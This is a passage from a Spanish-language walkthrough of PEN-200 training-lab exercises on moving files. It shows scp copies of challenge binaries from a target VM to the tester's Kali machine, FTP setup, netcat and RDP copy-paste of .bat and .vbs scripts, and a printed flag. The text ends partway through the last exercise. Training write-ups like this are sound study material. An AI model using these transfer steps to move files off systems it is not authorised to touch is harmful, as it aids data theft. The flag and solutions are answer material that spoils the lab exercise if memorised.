Warning: Permanently added '[192.168.231.52]:2222' (ED25519) to the list of known hosts.
Welcome to PEN-200 PowerShell.
student@192.168.231.52's password: 
PowerShell 7.2.0
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS /home/student> 
```

Dado que hemos accedido a través de SSH, asumimos que tenemos la herramienta SCP en el servidor: 

```
PS /challenge> scp 
usage: scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
            [-J destination] [-l limit] [-o ssh_option] [-P port]
            [-S program] source ... target
```

De esta forma, activamos el servicio ssh en nuestra máquina local:

```
> systemctl start ssh
> systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; preset: disabled)
     Active: active (running) since Tue 2023-02-28 04:13:50 EST; 6s ago
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 17102 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 17109 (sshd)
      Tasks: 1 (limit: 9433)
     Memory: 2.7M
        CPU: 26ms
     CGroup: /system.slice/ssh.service
             └─17109 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
```

Y utilizamos SCP para transferir el archivo:

```
PS /challenge> scp ./powershell-uploads kali@192.168.45.231:/home/kali/Desktop/powershell-uploads
The authenticity of host '192.168.45.231 (192.168.45.231)' can't be established.
ECDSA key fingerprint is SHA256:SuxscDceNWFdowv1KC4EJqj8Nk+oDdFX2tDdoet92q4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.45.231' (ECDSA) to the list of known hosts.
kali@192.168.45.231's password: 
powershell-uploads                                                                 100%   14KB  64.5KB/s   00:00    
```

De esta forma ya tenemos en nuestra máquina el binario:

```
> ls -l Desktop
total 28
-rwxr-xr-x 1 kali kali    95 Feb 26 12:41 badchars.py
-r--r--r-- 1 kali kali 14472 Feb 28 04:14 powershell-uploads
-rwxrw-rw- 1 kali kali  5815 Feb 25 18:04 universal.ovpn
> chmod +x Desktop/powershell-uploads 
> Desktop/powershell-uploads 
Great Job. Here is your flag: 
OS{8d24730dc9f3455ea5aa6fd106a5d6e1}
```

<br />

**7.  Necesitamos continuar desarrollando esta mentalidad de "Try Harder" en los nuevos pentesters; esta vez, usted nos ayudará a difundir este espíritu con el servicio FTP "Try Harder". Primero, acceda a SSH a la VM de destino n.º 3 y descargue try-harder.mp3. Luego, inicie un servicio FTP en su Kali Box, agregue el USUARIO offsec con el PASS offsec a este servicio FTP y copie try-harder.mp3 en su directorio FTP para que esté disponible para su descarga. Finalmente, descargue desde la VM n.° 3 y ejecute try-harder-ftp-service en su máquina Kali para verificar la finalización de estas tareas y obtener su marca.**

En primer lugar, nos logeamos dentro de la máquina con SSH y transferimos el fichero a nuestra máquina local con SCP:

```
student@645df033624b:/challenge$ scp try-harder.mp3 kali@192.168.45.199:/home/kali/try-harder.mp3 

kali@192.168.45.199's password: 
try-harder.mp3                                                                     100%   58KB 170.0KB/s   00:00    

student@c1203bbb5a5a:/challenge$ scp try-harder-ftp-service kali@192.168.45.199:/home/kali
kali@192.168.45.199's password: 
try-harder-ftp-service 
```

Ahora queda configurar el servidor FTP en nuestra máquina local. Para ello seguimos la gúia para instalar Pure-FTP vista anteriormente en estos mismos apuntes.

Una vez lo tenemos configurado, movemos el fichero try-harder.mp3 sobre el directorio raiz del servicio FTP que es según lo hemos configurado */ftphome* y procedemos a ejecutar el script try-harder-ftp-service.

<br />

**8. Hay muchas formas más sofisticadas de transferir archivos a sus objetivos, pero a veces el viejo Ctrl+C/Ctrl+V tendrá que ser suficiente. Conéctese al destino de Linux en el puerto 5000 en el grupo de máquinas virtuales n.º 1 y recupere el contenido de flag2hex.bat. Una vez conectado a través de RDP, copie el contenido de este archivo en la máquina de laboratorio del cliente de Windows y genere el binario flag2hex.exe para obtener la bandera.

Nos logeamos al servicio de Netcat en el puerto 5000 y copiamos y pegamos con Ctrl + Shift +C el contenido de flag2hex.bat que es un script de Batch (el lenguage de comandos de CMD) y lo pegamos sobre el ckliente de Windows después de logearnos con rdesktop y ejecutamos el script. Esto provocará que el archivo .bat sea sustituido por un .exe que nos dará la flag.

<br />

**9.  Ctrl+C/Ctrl+V es muy básico pero, a veces, algo básico es todo lo que necesitas. Conéctese a la máquina virtual de destino de Linux en el grupo de máquinas virtuales n.° 2 en el puerto 5000 y copie el contenido de so-basic.vbs en su cliente de Windows en la máquina de laboratorio del grupo de máquinas virtuales n.° 2. Cuando se ejecuta, este script ejecutará el so-basic.exe ofuscado , que creará la flag dentro del mismo directorio que el script.

